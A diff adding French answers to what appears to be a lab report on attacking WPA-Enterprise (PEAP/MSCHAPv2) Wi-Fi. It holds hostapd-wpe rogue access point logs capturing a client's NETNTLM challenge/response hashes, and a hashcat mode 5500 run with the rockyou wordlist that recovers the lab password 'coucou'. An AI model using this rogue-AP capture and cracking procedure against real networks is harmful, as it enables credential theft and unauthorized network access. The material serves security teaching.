@@ -170,11 +170,135 @@ Pour implémenter l’attaque :
 > 
 > **_Réponse :_** 
 
+Résultat de hostapd : 
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+[sudo] password for kali: 
+wlan0: interface state UNINITIALIZED->ENABLED
+wlan0: AP-ENABLED 
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: authenticated
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 84:cf:bf:91:c3:89
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+
+
+mschapv2: Wed May 31 12:12:57 2023
+         username:      meh
+         challenge:     c0:45:7a:75:4b:fb:11:9d
+         response:      5b:f1:d7:11:05:94:45:e3:2b:fa:f9:13:06:34:e3:b9:e4:e7:bf:34:3b:ed:b9:9c
+         jtr NETNTLM:           meh:$NETNTLM$c0457a754bfb119d$5bf1d711059445e32bfaf9130634e3b9e4e7bf343bedb99c
+         hashcat NETNTLM:       meh::::5bf1d711059445e32bfaf9130634e3b9e4e7bf343bedb99c:c0457a754bfb119d
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-FAILURE 84:cf:bf:91:c3:89
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: authenticated
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: associated (aid 1)
+wlan0: CTRL-EVENT-EAP-STARTED 84:cf:bf:91:c3:89
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+
+
+mschapv2: Wed May 31 12:13:02 2023
+         username:      meh
+         challenge:     fc:b0:03:7d:d1:21:c9:4f
+         response:      ed:fd:09:80:18:e9:ab:a1:79:77:aa:91:43:4c:48:b5:1b:60:08:de:52:5f:95:77
+         jtr NETNTLM:           meh:$NETNTLM$fcb0037dd121c94f$edfd098018e9aba17977aa91434c48b51b6008de525f9577
+         hashcat NETNTLM:       meh::::edfd098018e9aba17977aa91434c48b51b6008de525f9577:fcb0037dd121c94f
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Identity received from STA: 'meh'
+wlan0: CTRL-EVENT-EAP-FAILURE 84:cf:bf:91:c3:89
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
+wlan0: STA 84:cf:bf:91:c3:89 IEEE 802.11: deauthenticated due to local deauth request
+^Cwlan0: interface state ENABLED->DISABLED
+wlan0: AP-DISABLED                                                                                                
+wlan0: CTRL-EVENT-TERMINATING                                                                                     
+nl80211: deinit ifname=wlan0 disabled_11b_rates=0  
+```
+
+On peut constater que nous obtenons les hash du mot de passe. Nous crackerons
+ces hash avec hashcat à l'étape suivante.
+
+
 ---
 
 > **_Question:_** Quel type de hash doit-on indiquer à john ou l'outil que vous avez employé pour craquer le handshake ?
 > 
-> **_Réponse:_** 
+> **_Réponse:_** Nous avons utilisé hashcat. Il faut lui indiquer le type de
+> hash `5500`, ce qui correspond, selon la documentation, à `5500 | NetNTLMv1 / NetNTLMv1+ESS `
+
+Commande et résultat : 
+
+Notre fichier de hash `hashcat` contient le hash suivant trouvé avec hostapd : 
+
+```
+meh::::edfd098018e9aba17977aa91434c48b51b6008de525f9577:fcb0037dd121c94f
+```
+
+```
+$ hashcat -m 5500 --potfile-disable -d 1 hashcat /home/kali/Documents/rockyou.txt
+hashcat (v6.2.6) starting
+
+[...]
+
+Dictionary cache built:
+* Filename..: /home/kali/Documents/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+meh::::edfd098018e9aba17977aa91434c48b51b6008de525f9577:fcb0037dd121c94f:coucou
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
+Hash.Target......: meh::::edfd098018e9aba17977aa91434c48b51b6008de525f...21c94f
+Time.Started.....: Wed May 31 12:20:53 2023 (0 secs)
+Time.Estimated...: Wed May 31 12:20:53 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/home/kali/Documents/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   168.0 kH/s (0.13ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10240/14344385 (0.07%)
+Rejected.........: 0/10240 (0.00%)
+Restore.Point....: 8192/14344385 (0.06%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: total90 -> 1asshole
+Hardware.Mon.#1..: Util: 27%
+
+Started: Wed May 31 12:20:52 2023
+Stopped: Wed May 31 12:20:54 2023
+```
+
+Nous avons utilisé le dictionnaire de mot de passe standard `rockyou`, qui
+contient le mot de passe `coucou` utilisé lors de la connexion au réseau. On
+peut constater que hashcat l'a trouvé : 
+
+```
+meh::::edfd098018e9aba17977aa91434c48b51b6008de525f9577:fcb0037dd121c94f:coucou
+```
+
 
 ---
 
